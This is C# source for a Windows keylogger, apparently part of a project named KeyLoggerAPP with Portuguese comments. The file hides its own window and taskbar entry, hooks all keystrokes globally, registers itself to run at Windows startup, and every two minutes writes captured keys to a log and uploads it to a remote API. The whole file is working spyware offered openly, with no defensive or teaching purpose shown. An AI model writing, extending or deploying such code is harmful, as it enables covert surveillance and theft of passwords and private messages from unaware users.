using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace KeyLoggerAPP
{
    public partial class KeyLogger : Form
    {
        private GlobalKeyboardHook _globalKeyboardHook;
        public static string TextFull { get; set; } = string.Empty;
        public static DateTime LastSave { get; set; }

        public KeyLogger()
        {
            InitializeComponent();
        }

        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Opacity = 0;

            _globalKeyboardHook = new GlobalKeyboardHook(new Keys[] { Keys.A, Keys.B });

            _globalKeyboardHook = new GlobalKeyboardHook();
            _globalKeyboardHook.KeyboardPressed += OnKeyPressed;

            using (StartupApp startupApp = new StartupApp())
            {
                if (startupApp.StartWithWindows())
                {
                    //Remove para adicionar novamente, para ter a certeza de que o local do executavel esta atualizado
                    startupApp.RemoveStartWithWindows();
                }

                startupApp.SetStartup();
            }

            timer1.Start();
            base.OnLoad(e);
        }

        private void OnKeyPressed(object sender, GlobalKeyboardHookEventArgs e)
        {
            if (e.KeyboardState == GlobalKeyboardHook.KeyboardState.KeyDown)
            {
                TextFull += $"{ e.KeyboardData.Key}-";
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (DateTime.Now.Subtract(LastSave).TotalSeconds > 120 && TextFull.Length > 0)
            {
                //reseta as propriedades o quanto antes para nao interferir no timer
                LastSave = DateTime.Now;
                string text = TextFull;
                TextFull = string.Empty;

                SaveText(text);
            }
        }

        private static async void SaveText(string text)
        {
            FileInfo file = new FileInfo(Path.Combine(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "logger.log"));
            try
            {
                if (!file.Exists) { file.Create().Close(); }

                string AllText = File.ReadAllText(file.FullName);

                AllText += text;

                // Envia todo o log para a API se tiver sucesso, irá resetar o arquivo
                if (await ServiceHTTP.SendDataAsync(AllText))
                {
                    AllText = string.Empty;
                }

                File.WriteAllText(file.FullName, AllText);
            }
            catch
            { }
        }
    }
}
